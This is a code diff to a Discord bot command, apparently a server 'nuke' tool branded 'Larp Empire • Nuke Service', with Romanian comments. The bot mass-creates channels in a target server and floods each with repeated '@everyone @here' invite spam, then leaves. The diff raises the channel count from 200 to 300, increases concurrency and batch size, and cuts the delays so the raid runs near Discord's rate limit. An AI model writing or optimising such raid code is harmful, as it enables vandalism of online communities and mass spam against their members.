@@ -318,15 +318,14 @@ async def setup(ctx):
     embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
     embed_content.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== CREARE 200 CANALE =====
-    total_channels = 200
+    # ===== CREARE 300 CANALE (maxim posibil fără rate‑limit) =====
+    total_channels = 300
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale în mod RAPID...")
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale (viteză maximă)...")
 
-    # Semafor pentru trimitere mesaje (mărit pentru viteză)
-    send_semaphore = asyncio.Semaphore(8)
+    send_semaphore = asyncio.Semaphore(10)
 
     ping_counts = [10, 11, 12, 14, 15, 16, 17, 18, 20, 21]
 
@@ -334,11 +333,11 @@ async def setup(ctx):
         async with send_semaphore:
             try:
                 await channel.send(embed=embed_content)
-                await asyncio.sleep(0.15)
+                await asyncio.sleep(0.12)
                 ping_count = random.choice(ping_counts)
                 ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 await channel.send(content=ping_message)
-                await asyncio.sleep(0.15)
+                await asyncio.sleep(0.12)
             except:
                 pass
 
@@ -349,12 +348,11 @@ async def setup(ctx):
                 ping_count = random.randint(3, 6)
                 ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 await channel.send(content=ping_message)
-                await asyncio.sleep(0.1)
-            # Ultimul mesaj = embed
+                await asyncio.sleep(0.08)
             await channel.send(embed=embed_content)
         except discord.HTTPException as e:
             if e.status == 429:
-                await user.send(f"⚠️ Rate limit atins! Iese din server.")
+                await user.send(f"⚠️ Rate limit! Iese din server.")
                 await guild.leave()
                 return
             else:
@@ -377,11 +375,10 @@ async def setup(ctx):
 
         except Exception as e:
             await user.send(f"⚠️ Eroare canal {index}: {e}")
-            # Continuăm, nu părăsim serverul
 
-    # Creare în loturi de câte 10 cu pauză de 0.5 secunde
-    batch_size = 10
-    pause_between_batches = 0.5
+    # Creare în loturi de câte 15 (maxim recomandat)
+    batch_size = 15
+    pause_between_batches = 0.3
 
     for i in range(0, total_channels, batch_size):
         batch = [create_and_send(i+j) for j in range(batch_size) if i+j < total_channels]
@@ -390,7 +387,6 @@ async def setup(ctx):
 
     await user.send(f"✅ Canale create: {len(created_channels)}. Spam-ul rulează în fundal...")
 
-    # Așteptăm 15 secunde pentru ca spam-ul să avanseze
     await asyncio.sleep(15)
 
     await user.send("✅ Proces finalizat. Părăsesc serverul...")
